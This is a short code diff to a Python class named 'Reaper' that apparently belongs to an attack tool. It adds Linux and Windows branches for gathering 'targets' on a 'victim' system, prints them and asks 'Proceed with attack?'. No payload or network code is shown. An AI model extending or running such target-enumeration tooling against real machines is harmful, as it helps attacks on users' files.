@@ -41,10 +41,19 @@ class Reaper(Thread):
             "--------------------------------\n"
         )
 
+        targets = []
+        # Optimize target detection based on the OS
+        if victim.system.lower() == "linux":
+            targets = td.gather_targets_linux()
+        elif victim.system.lower() == "windows":
+            targets = td.gather_targets_windows()
+        else:
+            print("[WARNING]: Unrecognised OS. Aborting attack...")
+            return
+
         print("Locating targets...")
         print(f"Targeted directory: {td.target_path}")
-        targets = td.gather_targets_windows()
-        # print(f"Targets: {targets}")
+        print(f"Targets: {targets}")
         print(f"Target count: {len(targets)}")
 
         user_input = input("\nProceed with attack? [y/n]: ")
